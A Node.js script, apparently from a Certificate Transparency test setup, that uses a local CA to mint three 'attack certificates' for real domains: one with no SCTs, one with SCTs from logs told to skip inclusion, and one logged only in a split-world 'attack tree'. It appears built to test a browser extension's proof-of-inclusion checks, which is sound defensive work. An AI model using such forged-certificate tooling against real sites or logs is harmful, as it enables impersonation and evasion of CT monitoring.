// Generates all 3 attack certificates:
//   1. desmos.com    — No-SCT:        cert signed by CA, no SCTs embedded
//   2. centrum.cz    — Non-inclusion:  SCTs embedded but cert NOT in any tree
//   3. facebook.com  — Split-world:    SCTs embedded, cert in attack tree only
//
// Usage: node generate-all-certs.mjs

import * as pkijs from 'pkijs';
import * as asn1js from 'asn1js';
import crypto from 'node:crypto';
import fs from 'node:fs';
import path from 'node:path';

const { subtle } = crypto.webcrypto;
pkijs.setEngine("node", new pkijs.CryptoEngine({ crypto: crypto.webcrypto }));

const CA_DIR = path.join(import.meta.dirname, 'certs');

const LOG_A_URL = process.env.LOG_A_URL || 'https://loga.jvgc-a.com';
const LOG_B_URL = process.env.LOG_B_URL || 'https://logb.jvgc-a.com';

// ============================================================
// Load CA key + cert
// ============================================================

const caSigningKey = await subtle.importKey(
  'pkcs8',
  crypto.createPrivateKey(fs.readFileSync(path.join(CA_DIR, 'ca.key')))
    .export({ type: 'pkcs8', format: 'der' }),
  { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' },
  false, ['sign'],
);

const caCertNode = new crypto.X509Certificate(fs.readFileSync(path.join(CA_DIR, 'ca.crt')));
const caCert = pkijs.Certificate.fromBER(toAB(caCertNode.raw));

// ============================================================
// Certificate builder
// ============================================================

async function getOrCreateKey(name) {
  const keyPath = path.join(CA_DIR, `${name}.key`);
  if (fs.existsSync(keyPath)) {
    const pk = crypto.createPrivateKey(fs.readFileSync(keyPath));
    return subtle.importKey(
      'spki',
      crypto.createPublicKey(pk).export({ type: 'spki', format: 'der' }),
      { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256' },
      true, ['verify'],
    );
  }
  const pair = await subtle.generateKey(
    { name: 'RSASSA-PKCS1-v1_5', hash: 'SHA-256',
      modulusLength: 2048, publicExponent: new Uint8Array([1, 0, 1]) },
    true, ['sign', 'verify'],
  );
  const privDer = Buffer.from(await subtle.exportKey('pkcs8', pair.privateKey));
  fs.writeFileSync(keyPath,
    crypto.createPrivateKey({ key: privDer, format: 'der', type: 'pkcs8' })
      .export({ type: 'pkcs8', format: 'pem' }),
  );
  return pair.publicKey;
}

async function createCert(domain, serverPublicKey, { poison = false, sctExtension = null, serial, notBefore, notAfter } = {}) {
  const cert = new pkijs.Certificate();
  cert.version = 2;
  cert.serialNumber = new asn1js.Integer({ value: serial });
  cert.issuer = caCert.subject;
  cert.subject.typesAndValues.push(new pkijs.AttributeTypeAndValue({
    type: '2.5.4.3',
    value: new asn1js.Utf8String({ value: domain }),
  }));

  cert.notBefore.value = notBefore;
  cert.notAfter.value = notAfter;
  await cert.subjectPublicKeyInfo.importKey(serverPublicKey);

  cert.extensions = [];

  // SubjectAlternativeName
  const san = new pkijs.GeneralNames({
    names: [
      new pkijs.GeneralName({ type: 2, value: domain }),
      new pkijs.GeneralName({ type: 2, value: `www.${domain}` }),
    ],
  });
  cert.extensions.push(new pkijs.Extension({
    extnID: '2.5.29.17', critical: false,
    extnValue: san.toSchema().toBER(false),
  }));

  // SubjectKeyIdentifier
  const spkiRaw = await subtle.exportKey('spki', serverPublicKey);
  const pubKeyBits = asn1js.fromBER(spkiRaw).result.valueBlock.value[1].valueBlock.valueHexView;
  const skiHash = await subtle.digest('SHA-1', pubKeyBits);
  cert.extensions.push(new pkijs.Extension({
    extnID: '2.5.29.14', critical: false,
    extnValue: new asn1js.OctetString({ valueHex: skiHash }).toBER(false),
  }));

  // AuthorityKeyIdentifier
  const caSpki = caCertNode.publicKey.export({ type: 'spki', format: 'der' });
  const caPubBits = asn1js.fromBER(toAB(caSpki)).result.valueBlock.value[1].valueBlock.valueHexView;
  const akiHash = await subtle.digest('SHA-1', caPubBits);
  const akid = new pkijs.AuthorityKeyIdentifier({
    keyIdentifier: new asn1js.OctetString({ valueHex: akiHash }),
  });
  cert.extensions.push(new pkijs.Extension({
    extnID: '2.5.29.35', critical: false,
    extnValue: akid.toSchema().toBER(false),
  }));

  if (poison) {
    cert.extensions.push(new pkijs.Extension({
      extnID: '1.3.6.1.4.1.11129.2.4.3', critical: true,
      extnValue: new asn1js.Null().toBER(false),
    }));
  }

  if (sctExtension) {
    cert.extensions.push(sctExtension);
  }

  await cert.sign(caSigningKey, 'SHA-256');
  return cert;
}

function saveCert(cert, name) {
  const certDer = Buffer.from(cert.toSchema().toBER(false));
  const pem = '-----BEGIN CERTIFICATE-----\n' +
    certDer.toString('base64').match(/.{1,64}/g).join('\n') +
    '\n-----END CERTIFICATE-----\n';
  fs.writeFileSync(path.join(CA_DIR, `${name}.crt`), pem);
  return certDer.length;
}

async function submitToLogs(precert, { skipInclusion = false } = {}) {
  const precertB64 = Buffer.from(precert.toSchema().toBER(false)).toString('base64');
  const caB64 = caCertNode.raw.toString('base64');

  const logs = [
    { name: 'log-a', url: LOG_A_URL },
    { name: 'log-b', url: LOG_B_URL },
  ];

  const sctBinaries = [];

  for (const { name, url } of logs) {
    const headers = { 'Content-Type': 'application/json' };
    if (skipInclusion) headers['X-Skip-Inclusion'] = 'true';

    const resp = await fetch(`${url}/ct/v1/add-pre-chain`, {
      method: 'POST',
      headers,
      body: JSON.stringify({ chain: [precertB64, caB64] }),
    });

    if (!resp.ok) {
      console.error(`    ${name}: ${resp.status} ${await resp.text()}`);
      process.exit(1);
    }

    const sctJson = await resp.json();
    console.log(`    ${name} SCT: ts=${sctJson.timestamp}`);
    sctBinaries.push(sctJsonToBinary(sctJson));
  }

  return sctBinaries;
}

function buildSctExtension(sctBinaries) {
  const sctListBuf = buildSctList(sctBinaries);
  return new pkijs.Extension({
    extnID: '1.3.6.1.4.1.11129.2.4.2', critical: false,
    extnValue: new asn1js.OctetString({ valueHex: toAB(sctListBuf) }).toBER(false),
  });
}

// ============================================================
// Generate all 3 certs
// ============================================================

console.log('=== Generating attack certificates ===\n');

// Shared cert params per domain (precert + final cert MUST have identical TBS)
const now = new Date();
const notAfter = new Date(+now + 90 * 86400_000);

// --- 1. desmos.com — No-SCT ---
console.log('1. desmos.com (No-SCT)');
const desmosKey = await getOrCreateKey('desmos');
const desmosSerial = crypto.randomBytes(4).readUInt32BE();
const desmosCert = await createCert('desmos.com', desmosKey, {
  serial: desmosSerial, notBefore: now, notAfter,
});
const desmosSize = saveCert(desmosCert, 'desmos');
console.log(`   Saved certs/desmos.crt (${desmosSize} bytes) — no SCTs\n`);

// --- 2. centrum.cz — Non-inclusion ---
console.log('2. centrum.cz (Non-inclusion)');
const centrumKey = await getOrCreateKey('centrum');
const centrumSerial = crypto.randomBytes(4).readUInt32BE();
const centrumShared = { serial: centrumSerial, notBefore: now, notAfter };
const centrumPrecert = await createCert('centrum.cz', centrumKey, { poison: true, ...centrumShared });
console.log('   Submitting with X-Skip-Inclusion...');
const centrumScts = await submitToLogs(centrumPrecert, { skipInclusion: true });
const centrumCert = await createCert('centrum.cz', centrumKey, {
  sctExtension: buildSctExtension(centrumScts), ...centrumShared,
});
const centrumSize = saveCert(centrumCert, 'centrum');
console.log(`   Saved certs/centrum.crt (${centrumSize} bytes) — SCTs present, not in tree\n`);

// --- 3. facebook.com — Split-world ---
console.log('3. facebook.com (Split-world)');
const facebookKey = await getOrCreateKey('facebook');
const facebookSerial = crypto.randomBytes(4).readUInt32BE();
const facebookShared = { serial: facebookSerial, notBefore: now, notAfter };
const facebookPrecert = await createCert('facebook.com', facebookKey, { poison: true, ...facebookShared });
console.log('   Submitting normally (attack tree inclusion)...');
const facebookScts = await submitToLogs(facebookPrecert);
const facebookCert = await createCert('facebook.com', facebookKey, {
  sctExtension: buildSctExtension(facebookScts), ...facebookShared,
});
const facebookSize = saveCert(facebookCert, 'facebook');
console.log(`   Saved certs/facebook.crt (${facebookSize} bytes) — SCTs present, in attack tree\n`);

console.log('=== Done ===');
console.log('Expected extension results:');
console.log('  desmos.com   → No SCTs found');
console.log('  centrum.cz   → PoI FAIL (cert not in tree)');
console.log('  facebook.com → PoI PASS (cert in attack tree, not in public tree)');

// ============================================================
// Helpers
// ============================================================

function sctJsonToBinary(sctJson) {
  const version = Buffer.from([sctJson.sct_version]);
  const logId = Buffer.from(sctJson.id, 'base64');
  const timestamp = Buffer.alloc(8);
  timestamp.writeBigUInt64BE(BigInt(sctJson.timestamp));
  const extBytes = sctJson.extensions ? Buffer.from(sctJson.extensions, 'base64') : Buffer.alloc(0);
  const extLen = Buffer.alloc(2);
  extLen.writeUInt16BE(extBytes.length);
  const sigBytes = Buffer.from(sctJson.signature, 'base64');
  return Buffer.concat([version, logId, timestamp, extLen, extBytes, sigBytes]);
}

function buildSctList(scts) {
  let inner = 0;
  for (const s of scts) inner += 2 + s.length;
  const buf = Buffer.alloc(2 + inner);
  let off = 0;
  buf.writeUInt16BE(inner, off); off += 2;
  for (const s of scts) {
    buf.writeUInt16BE(s.length, off); off += 2;
    s.copy(buf, off); off += s.length;
  }
  return buf;
}

function toAB(buf) {
  const ab = new ArrayBuffer(buf.length);
  new Uint8Array(ab).set(buf);
  return ab;
}
